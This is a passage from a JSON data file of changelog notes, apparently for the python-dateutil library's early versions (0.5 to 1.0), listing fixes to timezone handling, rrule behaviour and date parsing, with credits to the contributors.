found.\n\n- Updating timezone information to version 2005q.\n\n\n", "1.0": "===========\n\n- Fixed parsing of XXhXXm formatted time after day/month/year\n  has been parsed.\n\n- Added patch by Jeffrey Harris optimizing rrule.__contains__.\n\n\n", "0.9": "===========\n\n- Fixed pickling of timezone types, as reported by\n  Andreas K\u00f6hler.\n\n- Implemented internal timezone information with binary\n  timezone files. datautil.tz.gettz() function will now\n  try to use the system timezone files, and fallback to\n  the internal versions. It's also possible to ask for\n  the internal versions directly by using\n  dateutil.zoneinfo.gettz().\n\n- New tzwin timezone type, allowing access to Windows\n  internal timezones (contributed by Jeffrey Harris).\n\n- Fixed parsing of unicode date strings.\n\n- Accept parserinfo instances as the parser constructor\n  parameter, besides parserinfo (sub)classes.\n\n- Changed weekday to spell the not-set n value as None\n  instead of 0.\n\n- Fixed other reported bugs.\n\n\n", "0.5": "===========\n\n- Removed ``FREQ_`` prefix from rrule frequency constants\n  WARNING: this breaks compatibility with previous versions.\n\n- Fixed rrule.between() for cases where \"after\" is achieved\n  before even starting, as reported by Andreas K\u00f6hler.\n\n- Fixed two digit zero-year parsing (such as 31-Dec-00), as\n  reported by Jim Abramson, and included test case for this.\n\n- Sort exdate and rdate before iterating over them, so that\n  it's not necessary to sort them before adding to the rruleset,\n  as reported by Nicholas Piper.\n"}}]